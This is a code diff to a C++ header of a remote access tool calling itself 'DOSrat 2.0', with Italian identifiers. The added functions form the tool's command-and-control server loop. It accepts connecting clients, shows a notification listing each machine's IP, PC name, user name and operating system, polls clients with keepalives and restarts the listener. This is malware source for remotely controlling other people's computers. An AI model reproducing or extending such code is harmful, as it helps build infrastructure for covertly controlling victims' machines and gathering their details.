@@ -1,6 +1,6 @@
 #pragma once
 
-class COMUNICAZIONI
+class Comunicazioni
 {
 private:
 	static void TerminaConnessione(int ID, SOCKET Sock)
@@ -54,7 +54,113 @@ public:
 		Clients[ID].info.IP = TcpIP::GetIP(Sock);
 		IPlocation::GetInfoFromIP(Clients[ID].info.IP, Clients[ID].info.Location);
 
-		Clu->AggiornaTitolo();
+		Clu.AggiornaTitolo();
+
+		return true;
+	}
+
+	static void AccettaConnessioni(TcpIP& Server, bool& mostraNotifiche)
+	{
+		SystemUtils su;
+		DirUtils du;
+		int c = 0;
+
+		su.ShowNotifyIcon("DOSrat 2.0");
+
+		while (true)
+		{
+			if (!ServerLoopController)
+				break;
+
+			for (int i = 0; i < MAX_CLIENTS; i++)
+			{
+				if (!Clients[i].IsConnected)
+				{
+					c = i;
+					i = MAX_CLIENTS;
+				}
+			}
+
+			if (Server.WaitConn(Clients[c].sock, 1000))
+				if (Inizializzazione(c, Clients[c].sock) && mostraNotifiche)
+					su.SendNotify("Client Connesso", "IP: " + Clients[c].info.IP + "\nPC: " + Clients[c].info.PCname + "\nUser: " + Clients[c].info.UserName + "\nOS: " + Clients[c].info.OS);
+		}
+
+		su.HideNotifyIcon();
+
+		return;
+	}
+
+	static void VerificaConnessioni()
+	{
+		while (true)
+		{
+			Sleep(500);
+
+			if (!ServerLoopController)
+				break;
+
+			for (int i = 0; i < MAX_CLIENTS; i++)
+			{
+				Sleep(2);
+
+				if (!ServerLoopController)
+					break;
+
+				if (Clients[i].IsConnected && !Clients[i].InTask)
+				{
+					TcpIP::SetTimeout(500, Clients[i].sock);
+
+					if (!TcpIP::SendString(Clients[i].sock, "keepalive"))
+					{
+						Clients[i].Kill();
+						Clu.AggiornaTitolo();
+					}
+					else if (Clients[i].info.CompatibleVer >= 5)
+					{
+						string tmp;
+
+						if (!TcpIP::RecvString(Clients[i].sock, tmp) || tmp == "")
+						{
+							Clients[i].Kill();
+							Clu.AggiornaTitolo();
+						}
+					}
+
+					TcpIP::SetTimeout(0, Clients[i].sock);
+				}
+			}
+		}
+
+		return;
+	}
+
+	static bool RestartServer(TcpIP& Server, int Port, bool& mostraNotifiche)
+	{
+		ServerLoopController = false;
+
+		Sleep(1000);
+
+		for (int i = 0; i < MAX_CLIENTS; i++)
+			if (Clients[i].IsConnected)
+			{
+				Clients[i].Kill();
+				Clu.AggiornaTitolo();
+			}
+
+		Server.Stop();
+		Server.Port = Port;
+		if (Server.StartServer() != 0)
+			return false;
+
+		Sleep(1000);
+
+		ServerLoopController = true;
+
+		thread Aconn(AccettaConnessioni, ref(Server), ref(mostraNotifiche));
+		thread Vconn(VerificaConnessioni);
+		Aconn.detach();
+		Vconn.detach();
 
 		return true;
 	}
